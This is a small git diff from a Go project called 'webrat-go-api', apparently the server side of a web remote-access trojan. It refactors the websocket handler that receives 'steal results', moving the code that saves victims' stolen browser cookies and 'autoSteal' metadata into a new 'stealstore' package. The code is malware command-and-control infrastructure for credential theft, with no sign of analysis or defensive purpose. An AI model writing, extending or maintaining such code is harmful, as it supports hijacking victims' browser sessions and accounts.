@@ -6,7 +6,7 @@ import (
 	"strings"
 	"time"
 
-	"webrat-go-api/internal/httpapi"
+	"webrat-go-api/internal/stealstore"
 	"webrat-go-api/internal/storage"
 
 	"github.com/gorilla/websocket"
@@ -315,12 +315,12 @@ func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
 		if cookies == "" {
 			continue
 		}
-		if err := httpapi.SaveStealResult(victimID, browserName, cookies); err != nil {
+		if err := stealstore.SaveResult(victimID, browserName, cookies); err != nil {
 			log.Printf("[ws] steal save error %s/%s: %v", victimID, browserName, err)
 		}
 	}
 
-	if err := httpapi.UpdateStealMeta(victimID, autoSteal); err != nil {
+	if err := stealstore.UpdateMeta(victimID, autoSteal); err != nil {
 		log.Printf("[ws] steal meta error %s: %v", victimID, err)
 	}
 
